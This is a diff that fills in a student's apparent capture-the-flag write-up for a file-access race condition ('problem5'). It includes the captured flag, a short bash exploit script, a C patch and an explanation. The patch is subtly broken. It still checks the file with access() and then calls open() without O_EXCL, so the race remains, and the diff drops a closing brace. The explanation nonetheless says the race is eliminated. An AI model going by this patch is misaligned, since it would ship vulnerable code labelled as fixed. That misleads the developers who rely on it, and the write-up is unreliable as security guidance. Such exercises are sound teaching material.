@@ -140,18 +140,74 @@ before comparing to the reset key to see if it was a negative value, and return 
 ## problem5
 
 ### Flag
-FLAG_GOES_HERE
+flag{366-r5C3c0nd170n}
 
 ### Exploit Steps
-1. List your steps here
+1. First, I tried to notice what type of vulnerability we were working with, and you can see that it is a race condition that has to do with file access
+2. So, I knew we needed to use a script to run and exploit this, so I set up a bash script
+3. I used the bash script to run the vulnerable program, sleep until the program was sleeping, get the process ID, and then use touch to infiltrate and attack while sleeping
+4. Here is the bash script
+   
+#!/bin/bash
+
+# Execute the vulnerable program
+./problem5 &
+
+# Store the PID of the program
+PID=$!
+
+# Sleep briefly to ensure that the program starts and enters the usleep call
+sleep 0.06
+
+# Create a flag file to indicate that the program is running
+touch /tmp/$PID
+
+# Clean up
+rm /tmp/$PID
 
 ### Patch
 ```diff
-+ Contents of ./diff/problem5.diff goes here
+--- .originals/problem5.c	2024-02-19 01:05:08.238714400 +0000
++++ problem5.c	2024-03-04 05:23:40.430303700 +0000
+@@ -1,3 +1,4 @@
++#include <fcntl.h>
+ #include <stdbool.h>
+ #include <stdio.h>
+ #include <unistd.h>
+@@ -17,17 +18,19 @@
+     // I'm tired. Checking access is hard work... I need some sleep. 0.1 seconds should do it.
+     usleep(100000);
+ 
+-    // Ok, let's open this file and write the flag to it.
+-    // Haha... just kidding, the user doesn't have access to the file, so this call will fail.
+-    FILE *outFile = fopen(destinationFile, "r");
+-    if (outFile == NULL) {
+-      printf("This is my file... I told you that you couldn't access it. Neener-neener!\n");
+-      // If the file did exist, we would write to it here.
+-      // fprintf(outFile, "The flag goes here");
++    // Check if the file exists before attempting to open it
++    if (access(destinationFile, F_OK) == 0) {
++      printf("Error: File already exists.\n");
+     } else {
+-      // Wait, how can the file both be not accessible and accessible?
+-      // Is this the fabled Schrödinger's file?!? Here, have my flag and go away!
+-      flag();
++      // Ok, let's open this file and write the flag to it.
++      // Now we can write to the file without worrying about race conditions.
++      int outFile = open(destinationFile, O_WRONLY | O_CREAT, 0644);
++      if (outFile == -1) {
++        printf("Error: Unable to create/open the file.\n");
++      } else {
++        flag();
++        close(outFile);
++      }
+     }
+   }
+-}
 ```
 
 ### Explanation
-In your own words, write a couple sentences about why this code is vulnerable and how you fixed this vulnerability. *(Keep to 200 words or less; preferably much less.)*
+The vulnerability was a race condition where the program checked for the existence of a file, then attempted to open it, allowing an attacker to create the file between these two operations and exploit it. The patch ensures safety by attempting to open the file with appropriate permissions, and so it eliminates the opportunity for exploitation.
 
 ---
 
